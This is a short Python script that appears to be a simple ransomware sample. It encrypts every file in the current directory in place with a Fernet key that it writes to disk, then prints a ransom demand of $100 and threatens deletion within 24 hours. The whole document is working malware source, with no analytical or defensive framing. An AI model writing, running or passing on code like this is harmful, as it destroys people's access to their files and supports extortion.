from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key"):
        continue
    if os.path.isfile(path):
        files.append(path)

for file in files:
    with open(file, "rb") as file1:
        rawData = file1.read()
    encryptedRawData = Fernet(key).encrypt(rawData)
    with open(file, "wb") as file2:
        file2.write(encryptedRawData)

print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
